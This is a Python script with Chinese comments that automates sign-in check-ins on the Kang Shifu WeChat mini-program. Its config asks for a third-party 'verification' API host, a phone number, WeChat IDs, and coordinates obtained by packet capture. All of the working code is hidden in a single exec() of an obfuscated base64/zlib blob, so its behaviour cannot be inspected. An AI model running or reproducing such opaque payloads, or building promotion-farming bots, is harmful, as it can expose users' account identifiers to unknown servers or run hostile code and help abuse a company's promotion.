#   --------------------------------注释区--------------------------------
#   康师傅扫码签到
#   入口:微信小程序---康师傅
#   需抓取数据: 
#   * 变量: ksfenv  备注api:port#phone#wxid1&wxid2#lat#lng#actid
#   api:port    过验证api以及port
#   phone       购买瓶盖的预留手机号
#   wxid1&wxid2 微信ID多账号使用&分割
#   lat         维度    (抓包或使用地图工具k获取)
#   lng         经度    (抓包或使用地图工具获取)
#   actid       抓包获取(有可能是固定的，没有测试)
#   多号分割方式 [ & 分割 ]
#   --------------------------------祈求区--------------------------------
#                     _ooOoo_
#                    o8888888o
#                    88" . "88
#                    (| -_- |)
#                     O\ = /O
#                 ____/`---'\____
#               .   ' \\| |// `.
#                / \\||| : |||// \
#              / _||||| -:- |||||- \
#                | | \\\ - /// | |
#              | \_| ''\---/'' | |
#               \ .-\__ `-` ___/-. /
#            ___`. .' /--.--\ `. . __
#         ."" '< `.___\_<|>_/___.' >'"".
#        | | : `- \`.;`\ _ /`;.`/ - ` : | |
#          \ \ `-. \_ __\ /__ _/ .-` / /
#  ======`-.____`-.___\_____/___.-`____.-'======
#                     `=---='
# 
#  .............................................
#           佛祖保佑             永无BUG
#           佛祖镇楼             BUG辟邪
#   --------------------------------代码区--------------------------------






exec((lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1])))(b'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'))
